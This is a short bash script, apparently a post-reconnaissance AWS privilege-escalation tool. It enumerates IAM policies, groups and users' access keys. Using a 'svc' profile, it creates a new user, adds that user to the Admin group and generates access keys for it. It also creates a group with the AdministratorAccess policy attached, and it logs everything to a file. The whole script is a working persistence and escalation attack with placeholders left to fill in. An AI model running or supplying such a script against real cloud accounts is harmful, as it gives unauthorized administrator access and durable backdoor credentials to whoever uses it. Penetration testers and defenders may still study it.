#!/bin/bash

#file vars
filepath=<local file dir here>
filename=escalation.txt

cd $filepath

rm -rf $filename

#user vars
uname=<username to create here>
group=Admin
policy="Default"
new_group="Default"


echo "Checking on Devious shit"

echo "Listing Policies"
echo "Policies:" >> $filename
aws iam list-policies --scope Local >> $filename


groups=(<groups from recon script here>)
echo "Group Policies"
for i in ${groups[@]}
	do 
		echo "Policy: $i" >> $filename
		aws iam list-group-policies --group-name $i >> $filename 
	done

echo "Creating User, Adding to Group and Generating Access Key"

echo "User: $uname" >> $filename
aws iam create-user --user-name $uname --profile svc >> $filename

echo "Adding to: $group" >> $filename
aws iam add-user-to-group --user-name $uname --group-name $group --profile svc >> $filename

echo "Key info:" >> $filename
aws iam create-access-key --user-name $uname --profile svc >> $filename

echo "Adding Group, Creating Policy, Attaching Policy to Group: $group & $policy" 

echo "Creating Group: $new_group" >> $filename
aws iam create-group --group-name $new_group

echo "Attaching Policy to Group"
aws iam attach-group-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --group-name $new_group 


#getting access key info
users=(<usernames from recon script go here>)
echo "Getting Access Keys" 
for user in ${users[@]}
do
	aws iam list-access-keys --user-name $user >> $filename
done

# echo "Getting policy info"
# aws iam get-policy-version --policy-arn arn:aws:iam::123456789012:policy/

# creating sec group in subnet from region & vpc in recon file 
# echo "Security Group"
# secgroup=$(aws ec2 create-security-group --group-name elGroupoSecuridad --description "Mi Grupo de Securidad" --vpc-id vpc-06a4fe96bf9a0e86e) >> $filename



